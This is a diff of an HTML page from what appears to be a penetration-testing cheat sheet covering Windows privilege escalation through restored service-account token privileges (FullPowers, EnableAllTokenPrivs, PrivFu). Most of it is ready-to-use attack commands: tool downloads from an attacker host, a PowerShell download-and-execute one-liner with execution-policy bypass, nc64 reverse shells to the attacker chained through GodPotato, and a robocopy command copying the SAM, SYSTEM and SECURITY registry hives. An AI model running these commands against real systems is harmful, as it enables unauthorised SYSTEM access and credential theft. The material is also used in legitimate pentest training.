-        <div class="page-title">💪 FullPowers — Restore Missing Tokens <span class="severity-badge sev-gold">TOKEN RECOVERY</span></div>
-        <div class="page-sub">// SERVICE ACCOUNTS WITH STRIPPED TOKENS → RESTORE SeImpersonate/SeAssignPrimaryToken</div>
+        <div class="page-title">&#128170; FullPowers &mdash; Restore Missing Tokens <span class="severity-badge sev-gold">TOKEN RECOVERY</span></div>
+        <div class="page-sub">// SERVICE ACCOUNTS WITH STRIPPED TOKENS &rarr; RESTORE SeImpersonate/SeAssignPrimaryToken</div>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Problem</div><div class="info-value">LOCAL SERVICE / NETWORK SERVICE shells lose SeImpersonate at runtime</div></div>
+        <div class="info-card"><div class="info-label">FullPowers.exe</div><div class="info-value">Spawns a new process via scheduled task — recovers FULL token with SeImpersonate</div></div>
+        <div class="info-card"><div class="info-label">EnableAllTokenPrivs.ps1</div><div class="info-value">Calls AdjustTokenPrivileges on ALL disabled privs in current token — simpler but only enables, doesn't RESTORE stripped privs</div></div>
+        <div class="info-card"><div class="info-label">Key Difference</div><div class="info-value">FullPowers = recover STRIPPED privs. EnableAllTokenPrivs = enable DISABLED privs already in token</div></div>
+      </div>
+      <div class="alert alert-red">
+        <span class="alert-icon">!</span>
+        <span><strong>Key distinction:</strong> <code>FullPowers.exe</code> recovers privileges that are <em>completely absent</em> from the token (stripped by Windows at spawn time). <code>EnableAllTokenPrivs.ps1</code> only enables privileges that are <em>present but disabled</em> in the current token. Use FullPowers when <code>whoami /priv</code> shows SeImpersonate is <em>missing entirely</em>; use EnableAllTokenPrivs when it shows <em>Disabled</em>.</span>
       </div>
       <div class="section">
-        <div class="section-header">⚡ The Problem</div>
+        <div class="section-header">&#9889; Method 1 &mdash; FullPowers.exe (itm4n) &mdash; Recover STRIPPED privileges</div>
         <div class="section-body">
-          <div class="alert alert-critical">
-            <span class="alert-icon">🔴</span>
-            <span>When a service account (LOCAL SERVICE, NETWORK SERVICE) spawns a shell via exploit, Windows strips dangerous privileges. SeImpersonatePrivilege may be missing even though the service account should have it.</span>
-          </div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Run FullPowers to restore tokens</div>
-              <div class="code-block green">.\FullPowers.exe
-.\FullPowers.exe -c ".\GodPotato-NET4.exe -cmd 'cmd /c whoami'"
-.\FullPowers.exe -c "C:\Users\Public\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd" -z</div>
+              <div class="step-title">Transfer FullPowers.exe</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/FullPowers.exe -o {{WPATH}}\FullPowers.exe</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">After FullPowers, verify tokens are restored</div>
+              <div class="step-title">Run FullPowers to restore tokens</div>
+              <div class="code-block green">REM Interactive -- spawns new cmd.exe with full default privileges:
+.\FullPowers.exe
+REM Non-interactive -- chain directly into potato (most common):
+.\FullPowers.exe -c ".\GodPotato-NET4.exe -cmd 'cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd'" -z
+REM Or: spawn reverse shell directly:
+.\FullPowers.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd" -z
+REM Extended privilege set (may fail on NETWORK SERVICE):
+.\FullPowers.exe -x</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Verify tokens are restored</div>
               <div class="code-block">whoami /priv
-# Should now show SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege</div>
+REM Should now show SeImpersonatePrivilege and SeAssignPrimaryTokenPrivilege as Enabled</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span><strong>How it works:</strong> FullPowers creates a scheduled task that runs as the current service account but with full default privileges (not stripped). The task spawns your command, then is immediately deleted. This bypasses the stripping done by <code>CreateProcessAsUser</code> in the service manager.</span>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">&#128279;</span>
+            <span>GitHub: <a href="https://github.com/itm4n/FullPowers" target="_blank">github.com/itm4n/FullPowers</a></span>
+          </div>
+        </div>
+      </div>
+      <div class="section">
+        <div class="section-header">&#9889; Method 2 &mdash; EnableAllTokenPrivs.ps1 (fashionproof) &mdash; Enable DISABLED privileges</div>
+        <div class="section-body">
+          <div class="alert alert-gold">
+            <span class="alert-icon">&#9733;</span>
+            <span>Use this when <code>whoami /priv</code> shows privileges as <strong>Disabled</strong> (they are IN the token but not active). This script calls <code>AdjustTokenPrivileges</code> to enable every disabled privilege in the current token. Works for SeBackupPrivilege, SeRestorePrivilege, SeManageVolumePrivilege, SeLoadDriverPrivilege, etc.</span>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Transfer EnableAllTokenPrivs.ps1 to target</div>
+              <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/EnableAllTokenPrivs.ps1 -o {{WPATH}}\ep.ps1
+REM Direct one-liner (if outbound HTTP allowed from target):
+powershell -ep bypass -c "iex(New-Object Net.WebClient).DownloadString('http://{{KALI_IP}}:{{PORT}}/windows/EnableAllTokenPrivs.ps1')"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Run the script &mdash; enables ALL disabled privileges in current token</div>
+              <div class="code-block green">powershell -ep bypass -File {{WPATH}}\ep.ps1
+REM Verify all privs are now Enabled:
+whoami /priv</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Now run your exploit (e.g. SeManageVolumeExploit.exe, robocopy /b, etc.)</div>
+              <div class="code-block">REM After enabling — SeManageVolumePrivilege example:
+.\SeManageVolumeExploit.exe
+REM SeBackupPrivilege example (now enabled, so robocopy /b works):
+robocopy /b C:\Windows\System32\config C:\Temp SAM SYSTEM SECURITY</div>
             </div>
           </div>
           <div class="alert alert-teal">
-            <span class="alert-icon">🔗</span>
-            <span>GitHub: <a href="https://github.com/itm4n/FullPowers" target="_blank">github.com/itm4n/FullPowers</a></span>
+            <span class="alert-icon">&#128279;</span>
+            <span>GitHub: <a href="https://github.com/fashionproof/EnableAllTokenPrivs" target="_blank">github.com/fashionproof/EnableAllTokenPrivs</a></span>
           </div>
         </div>
       </div>
@@ -3258,10 +3691,22 @@ iwr http://{{KALI_IP}}:{{PORT}}/windows/ExploitCapcom.exe -OutFile C:\Temp\Explo
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Enable all token privileges (PrivFu)</div>
-              <div class="code-block purple">.\PrivilegeEnabler.exe
-# Or with token-priv suite
-.\EnableAllPrivileges.exe</div>
+              <div class="step-title">Enable all disabled token privileges &mdash; EnableAllTokenPrivs.ps1 (fashionproof)</div>
+              <div class="code-block purple">REM RECOMMENDED: PowerShell script that enables ALL disabled privs in one shot:
+iwr http://{{KALI_IP}}:{{PORT}}/windows/EnableAllTokenPrivs.ps1 -o {{WPATH}}\ep.ps1
+powershell -ep bypass -File {{WPATH}}\ep.ps1
+REM Source: github.com/fashionproof/EnableAllTokenPrivs</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">1b</div>
+            <div class="step-content">
+              <div class="step-title">Alternative: PrivFu PrivilegeEnabler.exe (daem0nc0re) &mdash; same result, EXE format</div>
+              <div class="code-block purple">REM PrivFu toolkit — PrivilegedOperations\PrivilegeEnabler\bin\Release\PrivilegeEnabler.exe:
+iwr http://{{KALI_IP}}:{{PORT}}/windows/PrivilegeEnabler.exe -o {{WPATH}}\PrivilegeEnabler.exe
+.\PrivilegeEnabler.exe
+REM Source: github.com/daem0nc0re/PrivFu (look in PrivilegedOperations folder)
+REM NOTE: "EnableAllPrivileges.exe" from token-priv suite (hatRiot) is a separate tool — same concept</div>
             </div>
           </div>
           <div class="step">
